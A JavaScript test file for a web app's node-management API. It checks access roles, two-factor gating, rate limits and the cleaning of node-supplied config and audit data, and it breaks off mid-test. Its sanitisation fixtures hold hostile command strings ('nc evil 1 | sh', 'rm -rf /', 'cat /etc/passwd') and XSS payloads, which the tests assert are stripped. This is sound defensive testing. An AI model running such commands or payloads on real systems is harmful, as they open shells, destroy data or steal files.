// The manage API and page over HTTP: who may see and change what, the checks before a change,
// the budgets, the audit lines, and what a node's answers become. Most tests use a fake client
// (it records what was asked and answers what a test says); the end-to-end ones use the real
// signing client against the stub node in test/helpers/manage-node.js.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';
import { Monitor } from '../lib/monitor.js';
import { loadConfig } from '../lib/config.js';
import { createApp } from '../lib/app.js';
import { createLogin } from '../lib/login.js';
import { hashPassword } from '../lib/password.js';
import { UserStore } from '../lib/users.js';
import { Keyring } from '../lib/keys.js';
import { createAudit, createFailureLog } from '../lib/audit.js';
import { RECENT_AUTH_MS } from '../lib/account.js';
import { MANAGE_CONFIRM_READS_PER_USER, MANAGE_READS_PER_NODE, MANAGE_WRITES_PER_USER, cleanAudit, cleanReticulum, cleanState, skewText } from '../lib/manage-api.js';
import { createManageClient } from '../lib/manage.js';
import { sampleReticulum, startManageNode } from './helpers/manage-node.js';
import { base32Decode, totp } from '../lib/totp.js';
import { fakeHasher } from './helpers/fake-hasher.js';
import { FIRST_FACTOR_HOLD_MS, createFactorHolds } from '../lib/factor-hold.js';

const publicDir = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'public');
const NOW = 1_800_000_000_000;
const ALICE = 'correct horse battery';
const BOB = 'bobs own password';
const VIC = 'victors long password';
const KEYS = new Keyring(new Map([[1, crypto.randomBytes(32)]]));
const HOST = 'a.test:1';
const SECRET = 'rettui-manage-test-secret-0123456789abcdef';
const REV = '0123456789abcdef0123456789abcdef';
const ID = '00112233aabbccdd';
// A Reticulum change the website takes.
const RET_CHANGE = { path: ['interfaces', 'Hilltop TCP'], key: 'enabled', value: 'no' };

const STATE = {
  v: 1,
  node_time: NOW / 1000,
  version: '2.5.0',
  settings_revision: REV,
  settings: [
    { key: 'pn_name', label: 'Propagation node name', help: 'Shown in lists.', kind: 'text', access: 'change', value: 'Hilltop' },
    { key: 'pn_enabled', label: 'Propagation node', help: 'Off only.', kind: 'toggle', access: 'turn_off_only', value: 'true' },
  ],
  network: { state: 'running', shared_instance: false, interfaces_total: 2, interfaces_online: 2 },
  restart: null,
  restart_allowed_at: null,
  pending: null,
};

// A client that records every call and answers with answer(...args) (a fixed state by default).
// A test swaps fake.answer to change what comes next.
function fakeClient(answer = () => ({ ok: true, status: 200, body: STATE })) {
  const fake = {
    calls: [],
    answer,
    call: async (...args) => {
      fake.calls.push(args);
      return fake.answer(...args);
    },
  };
  return fake;
}
// The client setup() gives the app when the test passes none.
let client;

// Alice is an admin in the config file; bob (manage) and victor (viewer) are website users.
// manage: what createApp gets; hasher: for a test that holds a password check.
async function setup({ manage, hasher = fakeHasher, wallClock } = {}) {
  const dataDir = await fs.mkdtemp(path.join(os.tmpdir(), 'manage-'));
  const hash = await hashPassword(ALICE, undefined, fakeHasher);
  const config = loadConfig(`users:\n  - name: Alice\n    password_hash: '${hash}'\n    role: admin\nnodes:\n  - address: ${HOST}\n    name: Hilltop\n  - address: b.test:2\n`);
  const clock = { t: NOW };
  const now = () => clock.t;
  const logs = [];
  const store = await UserStore.open({ keys: KEYS, dataDir, configUsers: config.users, warn: () => {}, now, log: (m) => logs.push(m) });
  const pepper = store.currentPepper();
  await store.createUser({ name: 'bob', role: 'manage', passwordHash: await hashPassword(BOB, undefined, fakeHasher, pepper) });
  await store.createUser({ name: 'victor', role: 'viewer', passwordHash: await hashPassword(VIC, undefined, fakeHasher, pepper) });
  const audit = createAudit({ dataDir, now });
  const failures = createFailureLog({ dataDir, now });
  const login = createLogin({ users: config.users, store, settings: config.login, hasher, now, audit, failures, sleep: async () => {}, log: (m) => logs.push(m) });
  const monitor = new Monitor({ targets: config.targets, nodes: config.nodes, dataDir, probeFn: async () => ({ up: true, ms: 1 }) });
  // The waits after a first second factor run on the clock of the sessions, plus ahead: a test
  // moves that on to let a wait run out without ending every session.
  const holdClock = { ahead: 0 };
  const holds = createFactorHolds({ dataDir, now: () => clock.t + holdClock.ahead });
  const server = createApp({ monitor, publicDir, login, holds, manage: manage === undefined ? { client, nodes: [HOST] } : manage, ...(wallClock ? { wallClock } : {}) });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const texts = [];
  return {
    port: server.address().port, clock, holdClock, holds, store, login, audit, dataDir, logs, texts,
    close: () => (server.closeAllConnections(), new Promise((r) => server.close(r))),
  };
}

function request(s, { method = 'GET', path: p, headers = {}, body }) {
  return new Promise((resolve, reject) => {
    const req = http.request({ host: '127.0.0.1', port: s.port, path: p, method, headers }, (res) => {
      let text = '';
      res.on('data', (c) => (text += c));
      res.on('end', () => {
        s.texts.push(text);
        resolve({ status: res.statusCode, headers: res.headers, text, json: () => JSON.parse(text) });
      });
    });
    req.on('error', reject);
    if (body !== undefined) req.write(body);
    req.end();
  });
}

const FORM = { 'Content-Type': 'application/x-www-form-urlencoded', 'Sec-Fetch-Site': 'same-origin', 'X-Rettui-Request': '1' };
const JSON_HEADERS = { 'Content-Type': 'application/json', 'Sec-Fetch-Site': 'same-origin', 'X-Rettui-Request': '1' };
const api = (s, p, body, cookie, headers = JSON_HEADERS) => request(s, { method: 'POST', path: p, headers: { ...headers, ...(cookie ? { Cookie: cookie } : {}) }, body: typeof body === 'string' ? body : JSON.stringify(body) });
const get = (s, p, cookie, method = 'GET') => request(s, { method, path: p, headers: cookie ? { Cookie: cookie } : {} });
const cookieOf = (r) => (r.headers['set-cookie']?.[0] ?? '').split(';')[0];

async function logIn(s, name, password) {
  const r = await request(s, { method: 'POST', path: '/login', headers: FORM, body: new URLSearchParams({ name, password }).toString() });
  return cookieOf(r);
}

// Turns on the app code for the signed-in user, through the account API; gives code(), a fresh
// code each time (the clock moves on by 30 seconds after each, so none is used twice). A first
// second factor turned on on the website starts the wait before node changes (factor-hold.js);
// unless held, the wait is let run out, as for an account that turned it on a day or more ago (the
// session would not last that long, so the clock of the waits alone is moved on past it).
async function withTotp(s, cookie, password, { held = false } = {}) {
  const sec = (await api(s, '/api/account/totp/setup', { password }, cookie)).json().secret;
  const key = base32Decode(sec);
  assert.equal((await api(s, '/api/account/totp/enable', { code: totp(key, s.clock.t) }, cookie)).status, 200);
  if (!held) s.holdClock.ahead += FIRST_FACTOR_HOLD_MS;
  return () => {
    s.clock.t += 30_000;
    return totp(key, s.clock.t);
  };
}

const auditLines = async (s) => {
  await s.audit.flush();
  return (await fs.readFile(s.audit.file, 'utf8').catch(() => '')).trim().split('\n').filter(Boolean).map((l) => JSON.parse(l)).filter((l) => l.event.startsWith('manage-'));
};

const nodeGet = (s, cookie, host = HOST) => get(s, `/api/manage/node?host=${encodeURIComponent(host)}`, cookie);

test('only the manage and admin roles reach the manage page and its API', async () => {
  client = fakeClient();
  const s = await setup();
  try {
    assert.equal((await get(s, '/manage')).status, 404, 'signed out');
    assert.equal((await get(s, '/api/manage')).status, 401);
    assert.equal((await nodeGet(s)).status, 401);
    assert.equal((await api(s, '/api/manage/restart', { host: HOST })).status, 401);
    const v = await logIn(s, 'victor', VIC);
    assert.equal((await get(s, '/manage', v)).status, 404, 'a viewer');
    const denied = await get(s, '/api/manage', v);
    assert.equal(denied.status, 403);
    assert.doesNotMatch(denied.text, /Hilltop|a\.test/);
    assert.equal((await nodeGet(s, v)).status, 403);
    assert.equal((await get(s, `/api/manage/audit?host=${HOST}`, v)).status, 403);
    assert.equal((await api(s, '/api/manage/settings', { host: HOST, revision: REV, changes: { pn_name: 'x' }, password: VIC }, v)).status, 403);
    assert.equal(client.calls.length, 0, 'no node was asked for a viewer');
    assert.equal((await get(s, '/api/account', v)).json().role, 'viewer');
    for (const [name, pw] of [['bob', BOB], ['alice', ALICE]]) {
      const c = await logIn(s, name, pw);
      const page = await get(s, '/manage', c);
      assert.equal(page.status, 200, name);
      assert.equal(page.headers['cache-control'], 'private, no-store');
      assert.match(page.headers['content-security-policy'], /default-src 'none'; script-src 'self'; style-src 'self'/);
      assert.match(page.text, /<h1>Manage nodes<\/h1>/);
      assert.match(page.text, /<title>Manage - rettui<\/title>/);
      assert.equal((await get(s, '/api/manage', c)).status, 200, name);
    }
  } finally {
    await s.close();
  }
});

test('a user who must change a password an admin set gets neither the page nor the API', async () => {
  client = fakeClient();
  const s = await setup();
  try {
    const phc = await hashPassword('temporary password one', undefined, fakeHasher, s.store.currentPepper());
    await s.store.createUser({ name: 'newbie', role: 'manage', passwordHash: phc, mustChangePassword: true });
    const c = await logIn(s, 'newbie', 'temporary password one');
    assert.equal((await get(s, '/manage', c)).status, 404);
    const r = await get(s, '/api/manage', c);
    assert.equal(r.status, 403);
    assert.equal(r.json().mustChangePassword, true);
    assert.equal((await nodeGet(s, c)).status, 403);
    assert.equal(client.calls.length, 0);
  } finally {
    await s.close();
  }
});

test('every spelling of the manage page goes through its gate', async () => {
  client = fakeClient();
  const s = await setup();
  const spellings = ['/manage', '/manage/', '/manage.html', '/%6Danage.html', '/%6danage.html', '/manage.html/', '/manage%2ehtml', '/MANAGE.html', '/Manage.HTML', '/%4Danage.html', '/./manage.html', '/fonts/../manage.html'];
  try {
    const v = await logIn(s, 'victor', VIC);
    for (const p of spellings) {
      for (const [who, cookie] of [['signed out', undefined], ['viewer', v]]) {
        const r = await get(s, p, cookie);
        assert.equal(r.status, 404, `${p} ${who}`);
        assert.doesNotMatch(r.text, /manage-fields|Manage nodes/, `${p} ${who}`);
      }
      assert.equal((await get(s, p, v, 'HEAD')).status, 404, `HEAD ${p}`);
    }
    const b = await logIn(s, 'bob', BOB);
    const page = (await get(s, '/manage', b)).text;
    for (const p of spellings) {
      const r = await get(s, p, b);
      assert.equal(r.status, 200, p);
      assert.equal(r.text, page, p);
      assert.equal(r.headers['cache-control'], 'private, no-store', p);
    }
    // The script is a file, not a page.
    assert.equal((await get(s, '/manage-page.js')).status, 200);
  } finally {
    await s.close();
  }
  // Without users there is no manage page and no API, by any name.
  const dataDir = await fs.mkdtemp(path.join(os.tmpdir(), 'manage-'));
  const monitor = new Monitor({ targets: [{ host: 'a.test', port: 1 }], dataDir, probeFn: async () => ({ up: true, ms: 1 }) });
  const server = createApp({ monitor, publicDir, manage: { client: fakeClient(), nodes: [HOST] } });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const bare = { port: server.address().port, texts: [] };
  try {
    for (const p of [...spellings, '/api/manage', `/api/manage/node?host=${HOST}`]) assert.equal((await get(bare, p)).status, 404, p);
    assert.equal((await api(bare, '/api/manage/settings', { host: HOST })).status, 405);
  } finally {
    server.closeAllConnections();
    await new Promise((r) => server.close(r));
  }
});

test('GET /api/manage says who, whether they can change things, and the nodes by name, never a secret', async () => {
  client = fakeClient();
  const s = await setup({ manage: { client: createManageClient({ nodes: new Map([[HOST, { url: 'http://127.0.0.1:9', secret: SECRET, confirmSeconds: 300 }]]) }), nodes: [HOST, 'b.test:2'] } });
  try {
    const b = await logIn(s, 'bob', BOB);
    const r = await get(s, '/api/manage', b);
    assert.equal(r.status, 200);
    const body = r.json();
    assert.equal(body.me, 'bob');
    assert.equal(body.roleOk, true);
    assert.equal(body.secondFactor, false);
    assert.equal(body.recentSignIn, true);
    assert.equal(typeof body.recentUntil, 'string');
    assert.deepEqual(body.nodes, [{ host: HOST, name: 'Hilltop' }, { host: 'b.test:2', name: 'b.test:2' }]);
    assert.ok(Array.isArray(body.stepUpMethods));
    assert.equal(r.text.includes(SECRET), false);
    assert.doesNotMatch(r.text, /secret|127\.0\.0\.1:9/);
    // No nodes to manage: the page is there and says so; the API lists none.
    const none = await setup({ manage: null });
    try {
      const c = await logIn(none, 'bob', BOB);
      assert.deepEqual((await get(none, '/api/manage', c)).json().nodes, []);
      assert.equal((await get(none, '/manage', c)).status, 200);
      const missing = await nodeGet(none, c);
      assert.equal(missing.status, 404);
    } finally {
      await none.close();
    }
  } finally {
    await s.close();
  }
});

test('reading a node: the state is cleaned, the clock is compared, and an unknown node or HEAD asks nothing', async () => {
  const messy = {
    ...STATE,
    version: '2.5.0\u202e<script>',
    settings_revision: 'not hex',
    node_time: NOW / 1000 + 150,
    settings: [
      ...STATE.settings,
      { key: 'Bad Key', label: 'x', kind: 'text', access: 'change', value: 'x' },
      { key: 'hub_name', label: '<img src=x onerror=alert(1)>', help: 'h'.repeat(900), kind: 'weird', access: 'change', value: 7 },
      { key: 'log_level', label: 'Log', kind: 'choice', choices: ['info', 'debug', 5], access: 'change', value: 'info' },
      { key: 'pn_name', label: 'twice', kind: 'text', access: 'change', value: 'second' },
      { key: 'x_y', label: 'no access', kind: 'text', access: 'admin', value: '' },
    ],
    network: { state: 'exploded', interfaces_total: -1, interfaces_online: 'two' },
    restart: { id: 'abcdefabcdefabcd', state: 'up', started: 5, problems: ['eth0 offline', 3] },
    extra: 'dropped',
  };
  client = fakeClient(() => ({ ok: true, status: 200, body: messy, skewSeconds: 150 }));
  const s = await setup();
  try {
    const b = await logIn(s, 'bob', BOB);
    const r = await nodeGet(s, b);
    assert.equal(r.status, 200);
    const body = r.json();
    assert.equal(body.host, HOST);
    assert.equal(body.name, 'Hilltop');
    assert.equal(body.version, '2.5.0<script>', 'direction characters are taken out; the page sets it as text');
    assert.equal(body.settings_revision, '');
    assert.deepEqual(body.settings.map((x) => x.key), ['pn_name', 'pn_enabled', 'hub_name', 'log_level']);
    assert.equal(body.settings[0].value, 'Hilltop', 'the first of a key shown twice');
    assert.equal(body.settings[2].kind, 'text');
    assert.equal(body.settings[2].value, '7');
    assert.equal(body.settings[2].help.length, 500);
    assert.deepEqual(body.settings[3].choices, ['info', 'debug']);
    assert.deepEqual(body.network, { state: 'unknown', shared_instance: false, interfaces_total: null, interfaces_online: null });
    assert.deepEqual(body.restart, { id: 'abcdefabcdefabcd', state: 'up', started: 5, problems: ['eth0 offline'] });
    assert.equal('extra' in body, false);
    assert.equal(body.skewSeconds, 150);
    assert.deepEqual(body.clock, { skewMinutes: 3, warning: skewText(3) });
    assert.equal(skewText(3), "This node's clock is 3 minutes off from the website's, so signed requests can't be trusted; fix the node's time.");
    assert.deepEqual(client.calls[0], [HOST, 'GET', '/manage/v1/state', 'bob', undefined]);
    // In step: no warning.
    client.answer = () => ({ ok: true, status: 200, body: STATE, skewSeconds: 10 });
    const fine = (await nodeGet(s, b)).json();
    assert.equal(fine.skewSeconds, 10);
    assert.equal(fine.clock, undefined);
    const calls = client.calls.length;
    assert.equal((await nodeGet(s, b, 'c.test:3')).status, 404);
    assert.equal((await nodeGet(s, b, '')).status, 404);
    assert.equal((await get(s, `/api/manage/node?host=${HOST}`, b, 'HEAD')).status, 200);
    assert.equal(client.calls.length, calls, 'no node was asked');
    // Names are matched without regard to case.
    assert.equal((await nodeGet(s, b, 'A.TEST:1')).status, 200);
  } finally {
    await s.close();
  }
});

test('the Reticulum config of a node is checked and cut, and what is malformed is left out', () => {
  const good = { revision: REV, shared_instance: true, truncated: false, sections: [{ path: ['interfaces', 'A'], keys: [{ key: 'type', value: 'TCPClientInterface', set: true }, { key: 'passphrase', value: null, set: true }, { key: 'x', value: null, set: false }] }] };
  assert.deepEqual(cleanReticulum(good), { ...good, editable: [] });
  // Nothing, or not a map with a list of sections: null.
  for (const bad of [undefined, null, 'x', 5, [], {}, { sections: 'no' }, { sections: { length: 1 } }]) assert.equal(cleanReticulum(bad), null, JSON.stringify(bad));
  assert.equal(cleanState(STATE).reticulum, null);
  assert.equal(cleanState({ ...STATE, reticulum: 'nope' }).reticulum, null);
  // The revision and shared_instance are checked.
  assert.deepEqual(cleanReticulum({ revision: 'zz', shared_instance: 'yes', sections: [] }), { revision: '', shared_instance: false, truncated: false, sections: [], editable: [] });
  const long = 'x'.repeat(1000);
  const messy = cleanReticulum({
    revision: REV,
    shared_instance: false,
    sections: [
      null, 'str', 7, [], {},
      { path: [], keys: [] },
      { path: 'interfaces', keys: [] },
      { path: ['a', 'b', 'c', 'd', 'e'], keys: [] },
      { path: ['a', ''], keys: [] },
      { path: ['a', 5], keys: [] },
      { path: ['a', '\u202e\u0000'], keys: [] },
      { path: ['ok'], keys: 'no' },
      { path: ['empty list'], keys: [] },
      { path: [long, '<b>x</b>\u200b'], keys: [
        null, 'k', { key: 'a' }, { key: 'a', set: 'yes', value: 'v' }, { key: 'a', set: true, value: 5 }, { key: 'a', set: true, value: { x: 1 } },
        { key: 7, set: true, value: 'v' }, { key: '\u0007', set: true, value: 'v' }, { set: true, value: 'v' },
        { key: 'a\u202eb\n', set: true, value: '<script>x</script>\u0000\u200b' },
        { key: long, set: true, value: long },
        { key: 'empty', set: true, value: '' },
        { key: 'masked', set: false, value: null },
      ] },
    ],
  });
  assert.equal(messy.sections.length, 2, 'a section with a good path is kept, even with no keys; every other is dropped');
  assert.deepEqual(messy.sections[0], { path: ['empty list'], keys: [] });
  const full = messy.sections[1];
  assert.deepEqual(full.path, ['x'.repeat(256), '<b>x</b>'], 'a text is cut at 256 characters and cleaned; the page sets it as text');
  assert.deepEqual(full.keys.map((k) => k.key), ['ab', 'x'.repeat(256), 'empty', 'masked']);
  assert.deepEqual(full.keys[0], { key: 'ab', value: null, set: true }, 'a key that is not on the list of shown ones has no value');
  assert.equal(full.keys[1].value, null);
  assert.deepEqual(full.keys[2], { key: 'empty', value: null, set: true });
  assert.deepEqual(full.keys[3], { key: 'masked', value: null, set: false });
  // At most 128 sections, 64 keys in each, and 4 parts in a path; a cut says so.
  const many = cleanReticulum({ sections: Array.from({ length: 200 }, (_, i) => ({ path: ['a', 'b', 'c', 'd'], keys: Array.from({ length: 200 }, (_, j) => ({ key: `k${i}-${j}`, set: true, value: 'v' })) })) });
  assert.equal(many.sections.length, 128);
  assert.ok(many.sections.every((x) => x.keys.length === 64 && x.path.length === 4));
  assert.equal(many.truncated, true);
  // The cap counts the sections looked at, so malformed ones cannot push good ones in.
  const late = cleanReticulum({ sections: [...Array.from({ length: 128 }, () => null), { path: ['late'], keys: [] }] });
  assert.deepEqual(late.sections, []);
  assert.equal(late.truncated, true);
  // A __proto__ key is a name like any other.
  const proto = cleanReticulum(JSON.parse('{"sections":[{"path":["__proto__"],"keys":[{"key":"__proto__","set":true,"value":"x"}],"__proto__":{"y":1}}]}'));
  assert.deepEqual(proto.sections[0].keys, [{ key: '__proto__', value: null, set: true }]);
  assert.equal(({}).y, undefined);
});

test('the Reticulum config says when it is cut: by the node, too many sections, or too many keys, and not otherwise', () => {
  const sec = (n, keys = 1) => Array.from({ length: n }, (_, i) => ({ path: [`s${i}`], keys: Array.from({ length: keys }, (_, j) => ({ key: `k${j}`, set: true, value: null })) }));
  assert.equal(cleanReticulum({ sections: sec(128, 64) }).truncated, false, 'exactly at the caps');
  assert.equal(cleanReticulum({ sections: sec(129) }).truncated, true, 'too many sections');
  assert.equal(cleanReticulum({ sections: sec(129) }).sections.length, 128);
  assert.equal(cleanReticulum({ sections: sec(1, 65) }).truncated, true, 'too many keys');
  assert.equal(cleanReticulum({ sections: sec(1, 65) }).sections[0].keys.length, 64);
  assert.equal(cleanReticulum({ truncated: true, sections: [] }).truncated, true, 'the node says so');
  for (const v of [false, 'true', 1, null]) assert.equal(cleanReticulum({ truncated: v, sections: [] }).truncated, false, String(v));
});

test('the Reticulum config shows a value only for the keys on the list, and never for a key that is not set', () => {
  const k = (key, value, set = true) => ({ key, value, set });
  const shown = ['type', 'enabled', 'interface_enabled', 'mode', 'interface_mode', 'announce_cap', 'bitrate', 'ingress_control', 'enable_transport', 'share_instance', 'listen_ip', 'listen_port', 'target_host', 'target_port', 'reachable_on', 'discoverable'];
  const hidden = ['passphrase', 'network_name', 'ifac_netkey', 'ifac_size', 'name', 'port', 'forward_ip', 'MyKey', ''];
  const out = cleanReticulum({ sections: [{ path: ['interfaces', 'A'], keys: [...shown, ...hidden.filter(Boolean)].map((n) => k(n, 'secret-' + n)) }] }).sections[0].keys;
  for (const x of out) assert.equal(x.value, shown.includes(x.key) ? 'secret-' + x.key : null, x.key);
  assert.equal(out.length, shown.length + hidden.length - 1);
  assert.ok(out.every((x) => x.set === true));
  // A hostile node that sends a passphrase, a key in capitals or a value for a key that is not set.
  const hostile = cleanReticulum({ sections: [{ path: ['interfaces', 'H'], keys: [k('passphrase', 'hunter2'), k('PassPhrase', 'hunter3'), k('TYPE', 'TCPClientInterface'), k('target_host', 'x.example', false), k('bitrate', '10', false), k('mode', 'full')] }] }).sections[0].keys;
  assert.deepEqual(hostile, [k('passphrase', null), k('PassPhrase', null), k('TYPE', 'TCPClientInterface'), k('target_host', null, false), k('bitrate', null, false), k('mode', 'full')]);
  assert.doesNotMatch(JSON.stringify(hostile), /hunter/);
});

test('a section that runs a program shows only its type and whether it is enabled', () => {
  const k = (key, value, set = true) => ({ key, value, set });
  const keep = (keys) => cleanReticulum({ sections: [{ path: ['interfaces', 'P'], keys }] }).sections[0].keys.map((x) => x.key);
  // A pipe interface, however the type is spelled.
  for (const type of ['PipeInterface', 'pipeinterface', 'PIPEINTERFACE', 'MyPipe']) {
    assert.deepEqual(keep([k('type', type), k('enabled', 'yes'), k('command', 'rm -rf /'), k('target_host', 'h'), k('mode', 'full'), k('passphrase', 'hunter2')]), ['type', 'enabled'], type);
  }
  // A command key, or a location_cmd, in a section of any type; also when not set.
  assert.deepEqual(keep([k('type', 'TCPClientInterface'), k('enabled', 'yes'), k('target_host', 'h'), k('location_cmd', '/bin/sh', false)]), ['type', 'enabled']);
  assert.deepEqual(keep([k('type', 'TCPClientInterface'), k('Command', null), k('bitrate', '1'), k('enabled', 'no')]), ['type', 'enabled']);
  // The value of the command is gone with it, and a hostile pipe sends nothing through.
  const text = JSON.stringify(cleanReticulum({ sections: [{ path: ['interfaces', 'P'], keys: [k('type', 'PipeInterface'), k('command', 'nc evil 1 | sh'), k('location_cmd', 'cat /etc/passwd')] }] }));
  assert.doesNotMatch(text, /evil|passwd/);
  // An ordinary section keeps all its keys.
  assert.deepEqual(keep([k('type', 'TCPClientInterface'), k('target_host', 'h'), k('passphrase', 'x')]), ['type', 'target_host', 'passphrase']);
  // Only a type that is a value counts; a key that is called pipe does not.
  assert.deepEqual(keep([k('type', 'TCPClientInterface'), k('pipe', 'x'), k('mode', 'full')]), ['type', 'pipe', 'mode']);
});

test('GET /api/manage/node passes the Reticulum config through, cleaned, and without it when the node sends none', async () => {
  client = fakeClient(() => ({ ok: true, status: 200, body: { ...STATE, reticulum: sampleReticulum() } }));
  const s = await setup();
  try {
    const b = await logIn(s, 'bob', BOB);
    const r = await nodeGet(s, b);
    assert.equal(r.status, 200);
    const ret = r.json().reticulum;
    assert.equal(ret.revision, 'f'.repeat(32));
    assert.equal(ret.shared_instance, false);
    assert.equal(ret.sections.length, 128);
    assert.equal(ret.truncated, true, 'the sample has more sections than are kept');
    assert.deepEqual(ret.sections[0].keys[2], { key: 'shared_instance_port', value: null, set: false });
    assert.deepEqual(ret.sections[1].keys[2], { key: 'passphrase', value: null, set: true }, 'the node sent hunter2; the website hides it too');
    assert.deepEqual(ret.sections[1].keys[0], { key: 'type', value: 'TCPClientInterface', set: true });
    assert.doesNotMatch(r.text, /hunter2/);
    assert.deepEqual(ret.sections[2].path, ['interfaces', '<img src=x onerror=alert(1)>'], 'the markup stays text; the control characters are gone');
    assert.deepEqual(ret.sections[2].keys[0], { key: '<b>type</b>', value: null, set: true });
    assert.equal(ret.sections[2].keys[1].value, null);
    assert.equal(ret.sections[3].keys.length, 64);
    assert.doesNotMatch(r.text, /\\u202e|\\u0000|\\u200b|\\u0007/);
    // The node says nothing, or something that is not a config: null.
    for (const value of [undefined, null, 'x', [], { sections: 3 }]) {
      client.answer = () => ({ ok: true, status: 200, body: { ...STATE, ...(value === undefined ? {} : { reticulum: value }) } });
      const none = await nodeGet(s, b);
      assert.equal(none.status, 200);
      assert.equal(none.json().reticulum, null, JSON.stringify(value));
    }
    client.answer = () => ({ ok: true, status: 200, body: { ...STATE, reticulum: { revision: REV, shared_instance: true, sections: [] } } });
    assert.deepEqual((await nodeGet(s, b)).json().reticulum, { revision: REV, shared_instance: true, truncated: false, sections: [], editable: [] });
  } finally {
    await s.close();
  }
});

test('the Reticulum config through the stub node: signed, cleaned and capped end to end', async () => {
  const node = await startManageNode({ secret: SECRET });
  const real = createManageClient({ nodes: new Map([[HOST, { url: node.url, secret: SECRET, confirmSeconds: 300 }]]) });
  const s = await setup({ manage: { client: real, nodes: [HOST] } });
  try {
    const b = await logIn(s, 'bob', BOB);
    const ret = (await nodeGet(s, b)).json().reticulum;
    assert.equal(ret.sections.length, 128);
    assert.equal(ret.truncated, true);
    assert.deepEqual(ret.sections[1].path, ['interfaces', 'Hilltop TCP']);
    assert.equal(ret.sections[3].keys.length, 64);
    node.reticulum = null;
    assert.equal((await nodeGet(s, b)).json().reticulum, null);
    delete node.reticulum;
    assert.equal((await nodeGet(s, b)).json().reticulum, null);
    // Only the node's say counts: no secret and nothing else of the node's text slips through.
    assert.ok(s.texts.every((t) => !t.includes(SECRET)));
  } finally {
    await s.close();
    await node.close();
  }
});

test('the audit list: before and limit are checked and passed on, and the entries are cleaned', async () => {
  client = fakeClient(() => ({
    ok: true,
    status: 200,
    body: {
      entries: [
        { seq: 7, time: 100, id: ID, actor: 'bob​', op: 'settings', changes: [{ key: 'pn_name', from: 'a', to: 'b' }, { key: 'BAD', from: 1, to: 2 }], result: 'ok', error: null },
        { seq: 6, time: 90, id: 'nothex', actor: 'x'.repeat(80), op: 'evil', changes: 'no', result: 'what', error: 'e'.repeat(500) },
        { seq: 'x' },
      ],
      more: true,
    },
  }));
  const s = await setup();
  try {
    const b = await logIn(s, 'bob', BOB);
    const r = await get(s, `/api/manage/audit?host=${HOST}`, b);
    assert.equal(r.status, 200);
    const body = r.json();
    assert.equal(body.more, true);
    assert.equal(body.entries.length, 2);
    assert.deepEqual(body.entries[0], { seq: 7, time: 100, id: ID, actor: 'bob', op: 'settings', changes: [{ key: 'pn_name', from: 'a', to: 'b' }], result: 'ok', error: null, notes: [] });
    assert.equal(body.entries[1].id, null);
    assert.equal(body.entries[1].actor.length, 32);
    assert.equal(body.entries[1].op, 'other');
    assert.deepEqual(body.entries[1].changes, []);
    assert.equal(body.entries[1].result, 'other');
    assert.equal(body.entries[1].error.length, 300);
    assert.equal(client.calls[0][2], '/manage/v1/audit?limit=50');
    await get(s, `/api/manage/audit?host=${HOST}&before=7&limit=20`, b);
    assert.equal(client.calls[1][2], '/manage/v1/audit?before=7&limit=20');
    for (const q of ['before=-1', 'before=x', 'limit=0', 'limit=101', 'limit=1e2', 'before=1234567890123456']) {
      assert.equal((await get(s, `/api/manage/audit?host=${HOST}&${q}`, b)).status, 400, q);
    }
    assert.equal(client.calls.length, 2);
    assert.deepEqual(cleanAudit(null), { entries: [], more: false });
    assert.equal(cleanState('nope').settings.length, 0);
  } finally {
    await s.close();
  }
});

test('reads are limited per user and node', async () => {
  client = fakeClient();
  const s = await setup();
  try {
    const b = await logIn(s, 'bob', BOB);
    for (let i = 0; i < MANAGE_READS_PER_NODE; i++) assert.equal((await nodeGet(s, b)).status, 200, `read ${i + 1}`);
    const over = await nodeGet(s, b);
    assert.equal(over.status, 429);
    assert.ok(Number(over.headers['retry-after']) > 0);
    assert.equal((await get(s, `/api/manage/audit?host=${HOST}`, b)).status, 429, 'the audit list counts too');
    assert.equal(client.calls.length, MANAGE_READS_PER_NODE);
    // Another user, and an hour later, may read again.
    const a = await logIn(s, 'alice', ALICE);
    assert.equal((await nodeGet(s, a)).status, 200);
    s.clock.t += 60 * 60_000;
    const b2 = await logIn(s, 'bob', BOB);
    assert.equal((await nodeGet(s, b2)).status, 200);
  } finally {
    await s.close();
  }
});

test('a user without two-step sign-in can look but not change anything', async () => {
  client = fakeClient();
  const s = await setup();
  try {
    const b = await logIn(s, 'bob', BOB);
    assert.equal((await nodeGet(s, b)).status, 200);
    for (const [p, body] of [['/api/manage/settings', { host: HOST, revision: REV, changes: { pn_name: 'x' } }], ['/api/manage/restart', { host: HOST }], ['/api/manage/rollback', { host: HOST, id: ID }], ['/api/manage/reticulum', { host: HOST, revision: REV, changes: [RET_CHANGE] }]]) {
      const r = await api(s, p, { ...body, password: BOB }, b);
      assert.equal(r.status, 403, p);
      assert.equal(r.json().code, 'second-factor-required', p);
    }
    assert.equal(client.calls.length, 1, 'only the read');
    assert.deepEqual(await auditLines(s), []);
  } finally {
    await s.close();
  }
});

test('changes only come from the page itself, as JSON with the header, after a recent sign in', async () => {
  client = fakeClient();
  const s = await setup();
  try {
    const b = await logIn(s, 'bob', BOB);
    const code = await withTotp(s, b, BOB);
    const p = '/api/manage/settings';
    const body = { host: HOST, revision: REV, changes: { pn_name: 'x' }, password: BOB, code: code() };
    assert.equal((await api(s, p, body, b, { 'Content-Type': 'application/json', 'Sec-Fetch-Site': 'same-origin' })).status, 403, 'no header');
    assert.equal((await api(s, p, body, b, { 'Content-Type': 'application/json', 'Sec-Fetch-Site': 'cross-site', 'X-Rettui-Request': '1' })).status, 403, 'another site');
    assert.equal((await api(s, p, new URLSearchParams({ host: HOST }).toString(), b, FORM)).status, 415);
    assert.equal((await api(s, p, JSON.stringify({ ...body, pad: 'x'.repeat(17_000) }), b)).status, 413);
    assert.equal((await api(s, p, '[1]', b)).status, 400);
    assert.equal((await api(s, '/api/manage/other', body, b)).status, 405, 'not a change');
    s.clock.t += RECENT_AUTH_MS;
    const stale = await api(s, p, { ...body, code: code() }, b);
    assert.equal(stale.status, 403);
    assert.equal(stale.json().reauth, true);
    assert.equal(client.calls.length, 0);
  } finally {
    await s.close();
  }
});

test('a settings change: checked, confirmed with both factors, sent as the user, and written to audit.log without values', async () => {
  client = fakeClient((host, method, target) => {
